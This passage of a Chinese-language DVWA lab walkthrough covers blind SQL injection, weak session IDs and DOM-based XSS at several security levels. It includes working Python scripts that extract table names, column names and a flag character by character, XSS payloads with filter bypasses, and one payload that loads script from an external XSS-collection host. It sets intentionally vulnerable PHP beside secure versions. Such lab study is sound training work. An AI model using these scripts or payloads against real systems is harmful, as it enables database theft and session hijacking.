class="keyword">for</span> c <span class="keyword">in</span> dic:</span><br><span class="line">            tableName_payload = &#123;<span class="string">&quot;id&quot;</span>:<span class="string">&quot;1 and ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;&#125;,1))=&#123;&#125; #&quot;</span>.format(str(i),ord(c)),<span class="string">&#x27;Submit&#x27;</span>:<span class="string">&#x27;Submit&#x27;</span>&#125;</span><br><span class="line">            <span class="comment"># tableName_url = url + tableName_payload</span></span><br><span class="line">            <span class="comment"># print(tableName_url)</span></span><br><span class="line">            response = s.post(url, cookies=cookies, data=tableName_payload).text</span><br><span class="line">            <span class="keyword">if</span> TrueState <span class="keyword">in</span> response:</span><br><span class="line">                table_name += c</span><br><span class="line">                print(<span class="string">&#x27;table_name:&#x27;</span>,table_name)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 3.爆出指定表的所有列名</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ColumnName</span>(<span class="params">tablename</span>):</span></span><br><span class="line">    column_name = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">51</span>):</span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> dic:</span><br><span class="line">            columnName_payload = &#123;<span class="string">&quot;id&quot;</span>:<span class="string">&quot;1 and ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#123;&#125;),&#123;&#125;,1))=&#123;&#125; #&quot;</span>.format(tablename,str(i),ord(c)),<span class="string">&#x27;Submit&#x27;</span>:<span class="string">&#x27;Submit&#x27;</span>&#125;</span><br><span class="line">            <span class="comment"># columnName_url = url + columnName_payload</span></span><br><span class="line">            <span class="comment"># print(tableName_url)</span></span><br><span class="line">            response = s.post(url, cookies=cookies, data=columnName_payload).text</span><br><span class="line">            <span class="keyword">if</span> TrueState <span class="keyword">in</span> response:</span><br><span class="line">                column_name += c</span><br><span class="line">                print(<span class="string">&quot;column_name of TABLE &#123;&#125;:&#123;&#125;&quot;</span>.format(tablename,column_name))</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">flag</span>(<span class="params">columname, tablename</span>):</span></span><br><span class="line">    flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">51</span>):</span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> dic:</span><br><span class="line">            payload = &#123;<span class="string">&#x27;id&#x27;</span>:<span class="string">&quot;1 and ascii(substr((select &#123;&#125; from &#123;&#125;),&#123;&#125;,1))=&#123;&#125;#&quot;</span>.format(columname,tablename,i,ord(c)),<span class="string">&#x27;Submit&#x27;</span>:<span class="string">&#x27;Submit&#x27;</span>&#125;</span><br><span class="line">            <span class="comment"># flag_url = url + payload</span></span><br><span class="line">            response = s.post(url, cookies=cookies, data=payload).text</span><br><span class="line">            <span class="keyword">if</span> TrueState <span class="keyword">in</span> response:</span><br><span class="line">                flag += c</span><br><span class="line">                print(<span class="string">&quot;flag is&quot;</span>,flag)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="comment"># dbnameLength()</span></span><br><span class="line">    <span class="comment"># dbname()</span></span><br><span class="line">    <span class="comment"># tableName()</span></span><br><span class="line">    <span class="comment"># table_name: f14g15here,guestbook,users</span></span><br><span class="line">    <span class="comment"># ColumnName(&#x27;0x66313467313568657265&#x27;)</span></span><br><span class="line">    <span class="comment"># column_name of TABLE 0x66313467313568657265:f1Ag</span></span><br><span class="line">    flag(<span class="string">&#x27;f1Ag&#x27;</span>,<span class="string">&#x27;f14g15here&#x27;</span>)</span><br><span class="line">    <span class="comment"># flag is flag&#123;this_is_a_test_flag&#125;</span></span><br></pre></td></tr></table></figure><h2 id="High-6"><a href="#High-6" class="headerlink" title="High"></a>High</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_COOKIE[ <span class="string">&#x27;id&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $id = $_COOKIE[ <span class="string">&#x27;id&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check database</span></span><br><span class="line">    $getid  = <span class="string">&quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;$id&#x27; LIMIT 1;&quot;</span>;</span><br><span class="line">    $result = mysqli_query($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>],  $getid ); <span class="comment">// Removed &#x27;or die&#x27; to suppress mysql errors</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get results</span></span><br><span class="line">    $num = @mysqli_num_rows( $result ); <span class="comment">// The &#x27;@&#x27; character suppresses errors</span></span><br><span class="line">    <span class="keyword">if</span>( $num &gt; <span class="number">0</span> ) &#123;</span><br><span class="line">        <span class="comment">// Feedback for end user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Might sleep a random amount</span></span><br><span class="line">        <span class="keyword">if</span>( rand( <span class="number">0</span>, <span class="number">5</span> ) == <span class="number">3</span> ) &#123;</span><br><span class="line">            sleep( rand( <span class="number">2</span>, <span class="number">4</span> ) );</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// User wasn&#x27;t found, so the page wasn&#x27;t!</span></span><br><span class="line">        header( $_SERVER[ <span class="string">&#x27;SERVER_PROTOCOL&#x27;</span> ] . <span class="string">&#x27; 404 Not Found&#x27;</span> );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for end user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ((is_null($___mysqli_res = mysqli_close($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]))) ? <span class="literal">false</span> : $___mysqli_res);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>可以看到，High级别的代码利用cookie传递参数id，当SQL查询结果为空时，会执行函数<code>sleep(seconds)</code>，目的是为了扰乱基于时间的盲注。同时在 SQL查询语句中添加了LIMIT 1，希望以此控制只输出一个结果。</p><p>另外，注入点变成了<code>Cookie[&#39;id&#39;]</code>,至于payload，用Low级别的就可以。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># encoding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">dic = string.printable[:<span class="number">94</span>]</span><br><span class="line"><span class="comment"># print(dic)</span></span><br><span class="line"><span class="comment"># 注入点url</span></span><br><span class="line">url = <span class="string">&quot;http://localhost/dvwa/vulnerabilities/sqli_blind/&quot;</span></span><br><span class="line">TrueState = <span class="string">&#x27;exists&#x27;</span></span><br><span class="line">FlaseState = <span class="string">&#x27;MISSING&#x27;</span></span><br><span class="line">cookies = &#123;<span class="string">&#x27;security&#x27;</span>:<span class="string">&#x27;high&#x27;</span>,<span class="string">&#x27;PHPSESSID&#x27;</span>:<span class="string">&#x27;igtb1sfu1lm1gb9e4ug06i0d1e&#x27;</span>&#125;</span><br><span class="line">s = requests.Session()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 1.爆库名的长度</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbnameLength</span>():</span></span><br><span class="line">    <span class="keyword">for</span> DBlen <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">        PayloadofDBlen = <span class="string">&quot;1&#x27; and length(database())=&#123;&#125;%23&amp;Submit=Submit&quot;</span>.format(DBlen)</span><br><span class="line">        cookies[<span class="string">&#x27;id&#x27;</span>]=PayloadofDBlen</span><br><span class="line">        <span class="comment"># print(cookies)</span></span><br><span class="line">        response = s.get(url,cookies=cookies).text</span><br><span class="line">        <span class="keyword">if</span> TrueState <span class="keyword">in</span> response:</span><br><span class="line">            print(<span class="string">&quot;DBnamelen is &quot;</span>, DBlen)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 2.爆库名</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbname</span>():</span></span><br><span class="line">    DBlen = <span class="number">4</span></span><br><span class="line">    DBname = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, DBlen+<span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> dic:</span><br><span class="line">            DBnamePayload = <span class="string">&quot;1&#x27; and substr(database(),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27; #&quot;</span>.format(i,str(c))</span><br><span class="line">            cookies[<span class="string">&#x27;id&#x27;</span>] = DBnamePayload</span><br><span class="line">            response = s.get(url,cookies=cookies).text</span><br><span class="line">            <span class="keyword">if</span> TrueState <span class="keyword">in</span> response:</span><br><span class="line">                DBname += c</span><br><span class="line">                print(DBname)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    print(<span class="string">&quot;DBname is:&quot;</span>, DBname)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 3.爆出所有的表名</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tableName</span>():</span></span><br><span class="line">    table_name = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">51</span>):</span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> dic:</span><br><span class="line">            tableName_payload = <span class="string">&quot;1&#x27; and substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27; #&quot;</span>.format(str(i),str(c))</span><br><span class="line">            cookies[<span class="string">&#x27;id&#x27;</span>] = tableName_payload</span><br><span class="line">            response = s.get(url, cookies=cookies).text</span><br><span class="line">            <span class="keyword">if</span> TrueState <span class="keyword">in</span> response:</span><br><span class="line">                table_name += c</span><br><span class="line">                print(<span class="string">&#x27;table_name:&#x27;</span>,table_name)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 3.爆出指定表的所有列名</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ColumnName</span>(<span class="params">tablename</span>):</span></span><br><span class="line">    column_name = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">51</span>):</span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> dic:</span><br><span class="line">            columnName_payload = <span class="string">&quot;1&#x27; and substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;&#123;&#125;&#x27;),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27; #&quot;</span>.format(tablename,str(i),str(c))</span><br><span class="line">            cookies[<span class="string">&#x27;id&#x27;</span>] = columnName_payload</span><br><span class="line">            response = s.get(url, cookies=cookies).text</span><br><span class="line">            <span class="keyword">if</span> TrueState <span class="keyword">in</span> response:</span><br><span class="line">                column_name += c</span><br><span class="line">                print(<span class="string">&quot;column_name of TABLE &#123;&#125;:&#123;&#125;&quot;</span>.format(tablename,column_name))</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">flag</span>(<span class="params">columname, tablename</span>):</span></span><br><span class="line">    flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">51</span>):</span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> dic:</span><br><span class="line">            payload = <span class="string">&quot;1&#x27; and substr((select &#123;&#125; from &#123;&#125;),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27;#&quot;</span>.format(columname,tablename,i,str(c))</span><br><span class="line">            cookies[<span class="string">&#x27;id&#x27;</span>]=payload</span><br><span class="line">            response = s.get(url, cookies=cookies).text</span><br><span class="line">            <span class="keyword">if</span> TrueState <span class="keyword">in</span> response:</span><br><span class="line">                flag += c</span><br><span class="line">                print(<span class="string">&quot;flag is&quot;</span>,flag)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="comment"># dbnameLength()</span></span><br><span class="line">    <span class="comment"># dbname()</span></span><br><span class="line">    <span class="comment"># tableName()</span></span><br><span class="line">    <span class="comment"># table_name: f14g15here,guestbook,users</span></span><br><span class="line">    <span class="comment"># ColumnName(&#x27;f14g15here&#x27;)</span></span><br><span class="line">    <span class="comment"># column_name of TABLE f14g15here:f1ag</span></span><br><span class="line">    flag(<span class="string">&#x27;f1ag&#x27;</span>,<span class="string">&#x27;f14g15here&#x27;</span>)</span><br><span class="line">    <span class="comment"># flag is flag&#123;this_is_a_test_flag&#125;</span></span><br></pre></td></tr></table></figure><h2 id="Impossible-6"><a href="#Impossible-6" class="headerlink" title="Impossible"></a>Impossible</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_GET[ <span class="string">&#x27;Submit&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Check Anti-CSRF token</span></span><br><span class="line">    checkToken( $_REQUEST[ <span class="string">&#x27;user_token&#x27;</span> ], $_SESSION[ <span class="string">&#x27;session_token&#x27;</span> ], <span class="string">&#x27;index.php&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $id = $_GET[ <span class="string">&#x27;id&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Was a number entered?</span></span><br><span class="line">    <span class="keyword">if</span>(is_numeric( $id )) &#123;</span><br><span class="line">        <span class="comment">// Check the database</span></span><br><span class="line">        $data = $db-&gt;prepare( <span class="string">&#x27;SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;&#x27;</span> );</span><br><span class="line">        $data-&gt;bindParam( <span class="string">&#x27;:id&#x27;</span>, $id, PDO::PARAM_INT );</span><br><span class="line">        $data-&gt;execute();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Get results</span></span><br><span class="line">        <span class="keyword">if</span>( $data-&gt;rowCount() == <span class="number">1</span> ) &#123;</span><br><span class="line">            <span class="comment">// Feedback for end user</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// User wasn&#x27;t found, so the page wasn&#x27;t!</span></span><br><span class="line">            header( $_SERVER[ <span class="string">&#x27;SERVER_PROTOCOL&#x27;</span> ] . <span class="string">&#x27; 404 Not Found&#x27;</span> );</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Feedback for end user</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token</span></span><br><span class="line">generateSessionToken();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>可以看到，Impossible级别的代码采用了PDO技术，划清了代码与数据的界限，有效防御SQL注入，Anti-CSRF token机制的加入了进一步提高了安全性。</p><h1 id="Weak-Session-IDS"><a href="#Weak-Session-IDS" class="headerlink" title="Weak Session IDS"></a>Weak Session IDS</h1><h2 id="Low-8"><a href="#Low-8" class="headerlink" title="Low"></a>Low</h2><p>顾名思义，因为<code>Session</code>的加密算法太弱或者其他情况导致<code>sessionID</code>可以预测和伪造。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$html = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($_SERVER[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>] == <span class="string">&quot;POST&quot;</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span> ($_SESSION[<span class="string">&#x27;last_session_id&#x27;</span>])) &#123;</span><br><span class="line">        $_SESSION[<span class="string">&#x27;last_session_id&#x27;</span>] = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    $_SESSION[<span class="string">&#x27;last_session_id&#x27;</span>]++;</span><br><span class="line">    $cookie_value = $_SESSION[<span class="string">&#x27;last_session_id&#x27;</span>];</span><br><span class="line">    setcookie(<span class="string">&quot;dvwaSession&quot;</span>, $cookie_value);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>每点一次，<code>dvwaSession+1</code>，非常脆弱。</p><h2 id="Medium-8"><a href="#Medium-8" class="headerlink" title="Medium"></a>Medium</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$html = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($_SERVER[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>] == <span class="string">&quot;POST&quot;</span>) &#123;</span><br><span class="line">    $cookie_value = time();</span><br><span class="line">    setcookie(<span class="string">&quot;dvwaSession&quot;</span>, $cookie_value);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><code>dvwaSession</code>用时间作为<code>sessionid</code>，但是依然比较容易伪造。当我需要伪造这个session的时候，可以通过一个<code>time()</code>函数完成。</p><h2 id="High-7"><a href="#High-7" class="headerlink" title="High"></a>High</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$html = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($_SERVER[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>] == <span class="string">&quot;POST&quot;</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span> ($_SESSION[<span class="string">&#x27;last_session_id_high&#x27;</span>])) &#123;</span><br><span class="line">        $_SESSION[<span class="string">&#x27;last_session_id_high&#x27;</span>] = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    $_SESSION[<span class="string">&#x27;last_session_id_high&#x27;</span>]++;</span><br><span class="line">    $cookie_value = md5($_SESSION[<span class="string">&#x27;last_session_id_high&#x27;</span>]);</span><br><span class="line">    setcookie(<span class="string">&quot;dvwaSession&quot;</span>, $cookie_value, time()+<span class="number">3600</span>, <span class="string">&quot;/vulnerabilities/weak_id/&quot;</span>, $_SERVER[<span class="string">&#x27;HTTP_HOST&#x27;</span>], <span class="literal">false</span>, <span class="literal">false</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>加了<code>md5函数</code>，但是<code>md5(value)</code>md5的参数<code>$_SESSION[&#39;last_session_id_high&#39;]</code>导致md5的加密性不强，容易查到：</p><p><img src="https://i.loli.net/2020/03/03/JDihEq6t3ceGPfX.png"></p><h2 id="Impossible-7"><a href="#Impossible-7" class="headerlink" title="Impossible"></a>Impossible</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$html = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($_SERVER[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>] == <span class="string">&quot;POST&quot;</span>) &#123;</span><br><span class="line">    $cookie_value = sha1(mt_rand() . time() . <span class="string">&quot;Impossible&quot;</span>);</span><br><span class="line">    setcookie(<span class="string">&quot;dvwaSession&quot;</span>, $cookie_value, time()+<span class="number">3600</span>, <span class="string">&quot;/vulnerabilities/weak_id/&quot;</span>, $_SERVER[<span class="string">&#x27;HTTP_HOST&#x27;</span>], <span class="literal">true</span>, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>可以看到，Impossible级别的代码，通过加入随机数和事件来生成cookie，无意是难以猜解，非常安全的。</p><h1 id="XSS-DOM"><a href="#XSS-DOM" class="headerlink" title="XSS(DOM)"></a>XSS(DOM)</h1><blockquote><p>XSS，全称<code>Cross Site Scripting</code>，即跨站脚本攻击，某种意义上也是一种注入攻击，是指攻击者在页面中注入恶意的脚本代码，当受害者访问该页面时，恶意代码会在其浏览器上执行，需要强调的是，XSS不仅仅限于<code>JavaScript</code>，还包括flash等其它脚本语言。根据恶意代码是否存储在服务器中，XSS可以分为存储型的XSS与反射型的XSS。</p></blockquote><p>DOM，全称Document Object Model，是一个平台和语言都中立的接口，可以使程序和脚本能够动态访问和更新文档的内容、结构以及样式。DOM型XSS可能是存储型，也有可能是反射型，是基于DOM文档对象模型的一种漏洞。</p><p>在网站页面中有许多页面的元素，当页面到达浏览器时浏览器会为页面创建一个顶级的Document object文档对象，接着生成各个子文档对象，每个页面元素对应一个文档对象，每个文档对象包含属性、方法和事件。可以通过JS脚本对文档对象进行编辑从而修改页面的元素。也就是说，客户端的脚本程序可以通过DOM来动态修改页面内容，从客户端获取DOM中的数据并在本地执行。基于这个特性，就可以利用JS脚本来实现XSS漏洞的利用。以下属性都可能触发DOM型XSS：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">document.referer</span><br><span class="line">window.name</span><br><span class="line">location</span><br><span class="line">innerHTML</span><br><span class="line">documen.write</span><br></pre></td></tr></table></figure><h2 id="Low-9"><a href="#Low-9" class="headerlink" title="Low"></a>Low</h2><p>找XSS的漏洞，其实主要是从前端的HTML和js入手。</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">document.write(&quot;<span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&#x27;English&#x27;</span>&gt;</span>English<span class="tag">&lt;/<span class="name">option</span>&gt;</span>&quot;);</span><br><span class="line">document.write(&quot;<span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&#x27;French&#x27;</span>&gt;</span>French<span class="tag">&lt;/<span class="name">option</span>&gt;</span>&quot;);</span><br><span class="line">document.write(&quot;<span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&#x27;Spanish&#x27;</span>&gt;</span>Spanish<span class="tag">&lt;/<span class="name">option</span>&gt;</span>&quot;);</span><br><span class="line">document.write(&quot;<span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&#x27;German&#x27;</span>&gt;</span>German<span class="tag">&lt;/<span class="name">option</span>&gt;</span>&quot;);</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?default&#x3D;English&lt;script&gt;alert(&#39;xss&#39;);&lt;&#x2F;script&gt;</span><br><span class="line">用XSS平台接收一下：</span><br><span class="line">?default&#x3D;English&lt;sCRiPt&#x2F;SrC&#x3D;&#x2F;&#x2F;xss.pt&#x2F;****&gt;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/03/03/xZSahG1mjlYUF5R.png"></p><h2 id="Medium-9"><a href="#Medium-9" class="headerlink" title="Medium"></a>Medium</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Is there any input?</span></span><br><span class="line"><span class="keyword">if</span> ( array_key_exists( <span class="string">&quot;default&quot;</span>, $_GET ) &amp;&amp; !is_null ($_GET[ <span class="string">&#x27;default&#x27;</span> ]) ) &#123;</span><br><span class="line">    $default = $_GET[<span class="string">&#x27;default&#x27;</span>];</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># Do not allow script tags</span></span><br><span class="line">    <span class="keyword">if</span> (stripos ($default, <span class="string">&quot;&lt;script&quot;</span>) !== <span class="literal">false</span>) &#123;</span><br><span class="line">        header (<span class="string">&quot;location: ?default=English&quot;</span>);</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>通过<code>stripos()</code>函数过滤含有<code>&lt;script&gt;</code>的标签数据(不区分大小写)。但是还有很多标签如<code>&lt;vsg&gt;</code>，<code>&lt;img&gt;</code>等等绕过。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?default&#x3D;English&lt;&#x2F;option&gt;&lt;&#x2F;select&gt;&lt;img src&#x3D;1 onerror&#x3D;alert(&#39;xss&#39;)&gt;</span><br></pre></td></tr></table></figure><p>但是需要注意闭合前面的标签。</p><h2 id="High-8"><a href="#High-8" class="headerlink" title="High"></a>High</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Is there any input?</span></span><br><span class="line"><span class="keyword">if</span> ( array_key_exists( <span class="string">&quot;default&quot;</span>, $_GET ) &amp;&amp; !is_null ($_GET[ <span class="string">&#x27;default&#x27;</span> ]) ) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># White list the allowable languages</span></span><br><span class="line">    <span class="keyword">switch</span> ($_GET[<span class="string">&#x27;default&#x27;</span>]) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;French&quot;</span>:</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;English&quot;</span>:</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;German&quot;</span>:</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;Spanish&quot;</span>:</span><br><span class="line">            <span class="comment"># ok</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            header (<span class="string">&quot;location: ?default=English&quot;</span>);</span><br><span class="line">            <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>白名单 只允许 传的 default值 为 French English German Spanish 其中一个</strong></p><p>用<code>#</code>可以传入数据，</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?default&#x3D;English#&lt;script&gt;alert(1)&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure><h2 id="Impossible-8"><a href="#Impossible-8" class="headerlink" title="Impossible"></a>Impossible</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Don&#x27;t need to do anything, protction handled on the client side</span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>服务端不做任何事情，都在前端完成，从而没有输入点，避免了XSS。</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">document</span>.location.href.indexOf(<span class="string">&quot;default=&quot;</span>) &gt;= <span class="number">0</span>) &#123;</span><br><span class="line"><span class="keyword">var</span> lang = <span class="built_in">document</span>.location.href.substring(<span class="built_in">document</span>.location.href.indexOf(<span class="string">&quot;default=&quot;</span>)+<span class="number">8</span>);</span><br><span class="line"><span class="built_in">document</span>.write(<span class="string">&quot;&lt;option value=&#x27;&quot;</span> + lang + <span class="string">&quot;&#x27;&gt;&quot;</span> + (lang) + <span class="string">&quot;&lt;/option&gt;&quot;</span>);</span><br><span class="line"><span class="built_in">document</span>.write(<span class="string">&quot;&lt;option value=&#x27;&#x27; disabled=&#x27;disabled&#x27;&gt;----&lt;/option&gt;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">    </span><br><span class="line"><span class="built_in">document</span>.write(<span class="string">&quot;&lt;option value=&#x27;English&#x27;&gt;English&lt;/option&gt;&quot;</span>);</span><br><span class="line"><span class="built_in">document</span>.write(<span class="string">&quot;&lt;option value=&#x27;French&#x27;&gt;French&lt;/option&gt;&quot;</span>);</span><br><span class="line"><span class="built_in">document</span>.write(<span class="string">&quot;&lt;option value=&#x27;Spanish&#x27;&gt;Spanish&lt;/option&gt;&quot;</span>);</span><br><span class="line"><span class="built_in">document</span>.write(<span class="string">&quot;&lt;option value=&#x27;German&#x27;&gt;German&lt;/option&gt;&quot;</span>);</span><br><span class="line">&lt;/script&gt;</span><br><span 